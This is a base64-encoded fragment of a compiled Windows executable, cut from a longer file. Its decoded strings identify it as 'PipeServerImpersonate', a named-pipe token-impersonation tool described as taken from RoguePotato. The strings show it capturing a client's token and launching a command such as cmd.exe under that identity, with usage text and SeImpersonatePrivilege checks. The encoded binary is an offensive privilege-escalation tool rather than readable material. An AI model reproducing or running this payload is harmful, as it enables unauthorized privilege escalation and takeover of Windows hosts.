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ABbAC0AXQAgAE4AYQBtAGUAZAAgAHAAaQBwAGUAIABkAGkAZABuACcAdAAgAHIAZQBjAGUAaQB2AGUAZAAgAGEAbgB5ACAAYwBvAG4AbgBlAGMAdAAgAHIAZQBxAHUAZQBzAHQALgAgAEUAeABpAHQAaQBuAGcAIAAuAC4ALgAgAAoAAABQAGkAcABlAFMAZQByAHYAZQByAEkAbQBwAGUAcgBzAG8AbgBhAHQAZQAAAFcAcgBvAG4AZwAgAEEAcgBnAHUAbQBlAG4AdAA6ACAAJQBzAAoAAABbK10gU3RhcnRpbmcgUGlwZXNlcnZlci4uLgoAUwBlAEkAbQBwAGUAcgBzAG8AbgBhAHQAZQBQAHIAaQB2AGkAbABlAGcAZQAAAAAAAAAAAFsALQBdACAAQQAgAHAAcgBpAHYAaQBsAGUAZwBlACAAaQBzACAAbQBpAHMAcwBpAG4AZwA6ACAAJwAlAHcAcwAnAC4AIABFAHgAaQB0AGkAbgBnACAALgAuAC4ACgAAAFwAXAAuAFwAcABpAHAAZQBcACUAUwAAAAoKCVBpcGVTZXJ2ZXJJbXBlcnNvbmF0ZQoJQHNoaXRzZWN1cmUsIGNvZGUgc3RvbGVuIGZyb20gQHNwbGludGVyX2NvZGUncyAmJiBAZGVjb2Rlcl9pdCdzIFJvZ3VlUG90YXRvIChodHRwczovL2dpdGh1Yi5jb20vYW50b25pb0NvY28vUm9ndWVQb3RhdG8pIAoKCgAATWFuZGF0b3J5IGFyZ3M6IAotZSBjb21tYW5kbGluZTogY29tbWFuZGxpbmUgb2YgdGhlIHByb2dyYW0gdG8gbGF1bmNoCgAACgoAAAAAAABPcHRpb25hbCBhcmdzOiAKLXAgcGlwZW5hbWVfcGxhY2Vob2xkZXI6IHBsYWNlaG9sZGVyIHRvIGJlIHVzZWQgaW4gdGhlIHBpcGUgbmFtZSBjcmVhdGlvbiAoZGVmYXVsdDogUGlwZVNlcnZlckltcGVyc29uYXRlKQoteiA6IHRoaXMgZmxhZyB3aWxsIHJhbmRvbWl6ZSB0aGUgcGlwZW5hbWVfcGxhY2Vob2xkZXIgKGRvbid0IHVzZSB3aXRoIC1wKQoAAEV4YW1wbGUgdG8gZXhlY3V0ZSBjbWQuZXhlIGFuZCBjcmVhdGUgYSBuYW1lZCBwaXBlI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AAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAs0lAAAAAAABqSUAAdElAAP7///8AAAAApP///wAAAAD+////AAAAAMVHQAAAAAAAD0dAABlHQABAAAAAAAAAAAAAAABnSEAA/////wAAAAD/////AAAAAAAAAAAAAAAAAQAAAAEAAAD4xkEAIgWTGQIAAAAIx0EAAQAAABjHQQAAAAAAAAAAAAAAAAABAAAA/v///wAAAADQ////AAAAAP7///8RPkAAFT5AAAAAAAD+////AAAAANj///8AAAAA/v///74+QADCPkAAAAAAACZGQAAAAAAAnMdBAAIAAACox0EAxMdBAAAAAADA6EEAAAAAAP////8AAAAADAAAAMdFQAAAAAAA4OhBAAAAAAD/////AAAAAAwAAAD6RUAA/v///wAAAADY////AAAAAP7////hUkAA8VJAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAAD1UUAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHhWQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAHVZAAP////8HVEEAIgWTGQEAAABcyEEAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/v///wAAAADU////AAAAAP7///8AAAAAt4dAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAA6iUAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAN+IQAAAAAAA/v///wAAAADY////AAAAAP7///+vjUAAs41AAAAAAAD+////AAAAAND///8AAAAA/v///wAAAACFoUAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAA6iQAAAAAAA/v///wAAAAC0////AAAAAP7///8AAAAAuqJAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAfpkAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAACtQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAGq5AAAAAAAD+////AAAAANj///8AAAAA/v///wAAAABrrUAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAMCtQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAA0ctAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAAAYx0AAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAJfUQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAIt1AAAAAAAD+////AAAAANT///8AAAAA/v///wAAAABD30AAAAAAAP7///8AAAAAuP///wAAAAD+////AAAAAO/hQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAApN9AAAAAAAD+////AAAAAND///8AAAAA/v///wAAAAAo6kAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAMjqQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAhvNAAAAAAAD+////AAAAANj///8AAAAA/v///4AfQQCcH0EAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAAQhQQAAAAAA/v///wAAAADI////AAAAAP7///8AAAAAQyNBAAAAAAD+////AAAAANj///8AAAAA/v///5lIQQCsSEEAaMwBAAAAAAAAAAAAmM4BAFRgAQCQzQEAAAAAAAAAAAB+zwEAfGEBABTMAQAAAAAAAAAAAFDRAQAAYAEAAAAAAAAAAAAAAAAAAAAAAAAAAAA40QEAINEBAAzRAQD80AEA4tABAMTQAQCM0AEAeNABAGbQAQBK0AEALtABABrQAQAQ0AEA9M8BAOrPAQDgzwEAwM8BALDPAQCgzwEAis8BAAAAAAAi1QEANtUBAEbVAQBY1QEAaNUBAHzVAQCI1QEAltUBAKTVAQCGzgEAcs4BAF7OAQBOzgEAQM4BACzOAQAWzgEAAs4BAPbNAQDkzQEA2M0BAMjNAQAQ1QEAvM0BAF7RAQB60QEAmNEBAKzRAQDI0QEA4tEBAPjRAQAO0gEAKNIBAD7SAQBS0gEAZNIBAHjSAQCE0gEAlNIBAKzSAQDE0gEA3NIBAATTAQAQ0wEAHtMBACzTAQA20wEARNMBAFbTAQBm0wEAeNMBAIbTAQCc0wEArNMBALjTAQDO0wEA4NMBAPLTAQAE1AEAFNQBACLUAQA41AEARNQBAFjUAQBo1AEAetQBAITUAQCQ1AEAnNQBALLUAQDM1AEA5tQBAADVAQC01QEAAAAAAFjPAQA+zwEAIs8BABbPAQBozwEA7M4BANbOAQC+zgEAps4BAAbPAQAAAAAASQNIZWFwRnJlZQAAYQJHZXRMYXN0RXJyb3IAAEUDSGVhcEFsbG9jALQCR2V0UHJvY2Vzc0hlYXAAAHMEUmVhZEZpbGUAANwAQ3JlYXRlTmFtZWRQaXBlVwAA1wVXYWl0Rm9yU2luZ2xlT2JqZWN0ABsCR2V0Q3VycmVudFRocmVhZAAAhgBDbG9zZUhhbmRsZQDzAENyZWF0ZVRocmVhZAAAnABDb25uZWN0TmFtZWRQaXBlAAAXAkdldEN1cnJlbnRQcm9jZXNzAK4CR2V0UHJvY0FkZHJlc3MAAEtFUk5FTDMyLmRsbAAAZANTZXRVc2VyT2JqZWN0U2VjdXJpdHkA1gFHZXRVc2VyT2JqZWN0U2VjdXJpdHkAngJPcGVuV2luZG93U3RhdGlvblcAAKsBR2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AmQJPcGVuRGVza3RvcFcAAN0Dd3NwcmludGZXANUBR2V0VXNlck9iamVjdEluZm9ybWF0aW9uVwBMA1NldFByb2Nlc3NXaW5kb3dTdGF0aW9uAFAAQ2xvc2VEZXNrdG9wAABUAENsb3NlV2luZG93U3RhdGlvbgAAVVNFUjMyLmRsbAAAEABBZGRBY2Nlc3NBbGxvd2VkQWNlAEsBR2V0TGVuZ3RoU2lkAACOAUluaXRpYWxpemVBY2wAjwFJbml0aWFsaXplU2VjdXJpdHlEZXNjcmlwdG9yAAAWAEFkZEFjZQAAhQBDb3B5U2lkACAAQWxsb2NhdGVBbmRJbml0aWFsaXplU2lkAAA3AUdldEFjZQAAOAFHZXRBY2xJbmZvcm1hdGlvbgBdAUdldFNlY3VyaXR5RGVzY3JpcHRvckRhY2wA6AJTZXRTZWN1cml0eURlc2NyaXB0b3JEYWNsABoCT3BlblRocmVhZFRva2VuAPEARHVwbGljYXRlVG9rZW5FeAAAgQBDb252ZXJ0U3RyaW5nU2VjdXJpdHlEZXNjcmlwdG9yVG9TZWN1cml0eURlc2NyaXB0b3JXAACMAUltcGVyc29uYXRlTmFtZWRQaXBlQ2xpZW50AACNAENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XAMECUmV2ZXJ0VG9TZWxmAAAVAk9wZW5Qcm9jZXNzVG9rZW4AAB8AQWRqdXN0VG9rZW5Qcml2aWxlZ2VzAK8BTG9va3VwUHJpdmlsZWdlVmFsdWVXAEFEVkFQSTMyLmRsbAAArQVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAG0FU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAIwFVGVybWluYXRlUHJvY2VzcwAAhgNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AE0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAGAJHZXRDdXJyZW50UHJvY2Vzc0lkABwCR2V0Q3VycmVudFRocmVhZElkAADpAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAGMDSW5pdGlhbGl6ZVNMaXN0SGVhZAB/A0lzRGVidWdnZXJQcmVzZW50ANACR2V0U3RhcnR1cEluZm9XAHgCR2V0TW9kdWxlSGFuZGxlVwAA0wRSdGxVbndpbmQAMgVTZXRMYXN0RXJyb3IAADEBRW50ZXJDcml0aWNhbFNlY3Rpb24AAL0DTGVhdmVDcml0aWNhbFNlY3Rpb24AABABRGVsZXRlQ3JpdGljYWxTZWN0aW9uAF8DSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudACeBVRsc0FsbG9jAACgBVRsc0dldFZhbHVlAKEFVGxzU2V0VmFsdWUAnwVUbHNGcmVlAKsBRnJlZUxpYnJhcnkAwwNMb2FkTGlicmFyeUV4VwAALQFFbmNvZGVQb2ludGVyAGIEUmFpc2VFeGNlcHRpb24AAF4BRXhpdFByb2Nlc3MAdwJHZXRNb2R1bGVIYW5kbGVFeFcAANICR2V0U3RkSGFuZGxlAAASBldyaXRlRmlsZQB0AkdldE1vZHVsZUZpbGVOYW1lVwAA1gFHZXRDb21tYW5kTGluZUEA1wFHZXRDb21tYW5kTGluZVcAmwBDb21wYXJlU3RyaW5nVwAAsQNMQ01hcFN0cmluZ1cAAE4CR2V0RmlsZVR5cGUA/gVXaWRlQ2hhclRvTXVsdGlCeXRlAHUBRmluZENsb3NlAHsBRmluZEZpcnN0RmlsZUV4VwAAjAFGaW5kTmV4dEZpbGVXAIsDSXNWYWxpZENvZGVQYWdlALIBR2V0QUNQAACXAkdldE9FTUNQAADBAUdldENQSW5mbwDvA011bHRpQnl0ZVRvV2lkZUNoYXIAN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